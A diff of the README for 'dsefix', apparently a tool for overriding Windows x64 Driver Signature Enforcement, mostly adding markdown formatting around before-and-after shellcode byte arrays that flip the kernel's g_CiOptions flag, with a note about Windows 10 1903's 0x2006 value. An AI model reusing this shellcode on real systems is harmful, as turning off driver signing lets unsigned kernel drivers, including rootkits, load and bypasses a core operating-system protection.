@@ -1,11 +1,12 @@
-# dsefix
-Windows x64 Driver Signature Enforcement Overrider
+# dsefix  
+Windows x64 Driver Signature Enforcement Overrider  
 
 
-In windows 10 1903, g_CiOptions value is not 0x6 but 0x2006.
-I changed shellcode using bit operation so no more bsod when DSE re-enabled.
+In windows 10 1903, g_CiOptions value is not 0x6 but 0x2006.  
+I changed shellcode using bit operation so no more bsod when DSE re-enabled.  
 
-before
+before  
+```
 /*
 **  Disable DSE (Vista and above)
 **  xor rax, rax
@@ -24,9 +25,9 @@ const unsigned char scDisable[] = {
 const unsigned char scEnable8Plus[] = {
     0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3
 };
-
-
+```
 after
+```
 /*
 **  Disable DSE (W7 also has ci.dll)
 **  mov eax,[g_CiAddress]
@@ -46,3 +47,4 @@ unsigned char scDisable[] = {
 unsigned char scEnable[] = {
 	0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x06, 0xC3
 };
+```
